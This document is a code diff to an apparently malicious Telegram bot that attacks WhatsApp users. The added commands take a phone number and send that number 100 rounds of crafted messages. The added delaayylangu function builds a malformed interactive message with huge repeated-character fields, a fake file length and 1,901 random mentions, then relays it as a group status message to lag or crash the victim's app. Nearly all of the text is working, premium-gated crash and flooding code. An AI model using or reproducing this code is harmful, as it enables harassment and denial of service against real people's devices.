@@ -1767,7 +1767,9 @@ bot.action('/bug', async (ctx) => {
 🧬 - 𝐃𝐞𝐥𝐚𝐲 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
 ──────────────
 〢☐ /FaiqxRaraInvis [ Invisible Delay ]
+〢☐ /FaiqxRaraMedium [ Medium Delay ]
 〢☐ /FaiqxRaraHard [ Delay Hard ]
+〢☐ /FaiqxRaraExtreme [ Extreme Delay ]
 
 🧬 - 𝐅𝐨𝐫𝐜𝐥𝐨𝐬𝐞 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
 ────────────────
@@ -2047,6 +2049,98 @@ bot.command("FaiqxRaraHard", checkWhatsAppConnection, checkPremium, checkCooldow
   });
 });
 
+bot.command("FaiqxRaraMedium", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraHard 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = false;
+
+  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
+    caption: `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Delay Medium
+☐ Status: Process</blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+    for (let i = 0; i < 100; i++) {
+   await delaayylangu(sock, target);
+   await delaayylangu(sock, target);
+   await sleep(1000);
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Delay Medium
+☐ Status: Success</blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+
+bot.command("FaiqxRaraExtreme", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraHard 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = false;
+
+  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
+    caption: `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Delay Extreme
+☐ Status: Process</blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+    for (let i = 0; i < 100; i++) {
+   await invisibleSpam(sock, target);
+   await invisibleSpam(sock, target);
+   await delaayylangu(sock, target);
+   await delaayylangu(sock, target);
+   await KhasJawaDelayInvis(sock, target);
+   await KhasJawaDelayInvis(sock, target);
+   await sleep(1000);
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Delay Extreme
+☐ Status: Success</blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+      
 bot.command("FaiqxRaraForceCall", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraForceCall 62×××`);
@@ -3124,6 +3218,79 @@ async function KelBlank(target, type) {
     messageId: msg.key.id,
     participant: { jid: target },
   });
+}
+
+async function delaayylangu(sock, target) {
+  try {
+    let msg = await generateWAMessageFromContent(target, {
+      interactiveMessage: {
+        header: {
+        title: "document delay",
+          hasMediaAttachment: true,
+          documentMessage: {
+            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c&mms3=true",
+        mimetype: "image/jpeg",
+        title: "berasjaya.pdf",
+        fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
+        fileLength: "999999999999999",
+        fileName: "\x10" + "ꦾ".repeat(30000),
+        height: 9999,
+        width: 9999,
+        mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
+        directPath: "/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c",
+        mediaKeyTimestamp: "1755695348",
+        jpegThumbnail: null
+      },
+          videoMessage: {
+            url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356713_n.enc?ccb=11-4",
+      mimetype: "video/mp4",
+      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
+      fileLength: "289511",
+      seconds: 300,
+      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
+      caption: "\x10".repeat(500),
+      height: 9999,
+      width: 620,
+      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
+      directPath:
+        "/v/t62.7161-24/13158969_599169879950168_4005798415047356713_n.enc",
+      mediaKeyTimestamp: "1743",
+          }
+        },
+        body: {
+          text: null
+        },
+        contextInfo: {
+        mentionedJid: Array.from(
+          { length: 1901 },
+          () => `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`),
+          forwardingScore: 999,
+          isForwarded: true,
+          conversionSource: "call_permission_request"            
+    },
+      nativeFlowMessage: {
+          buttons: [
+            {
+              name: "galaxy_message",
+              paramsJson: "\x10".repeat(9000)
+            }
+          ]
+        }
+      }
+    }, {});  
+   
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: msg.message
+    }
+  },
+  {
+    participant: { jid: target },
+    messegeId: msg.key.id
+  });
+} catch (err) {
+  console.log(err.message)
+  }
 }
 
 //============( END ) =======\\
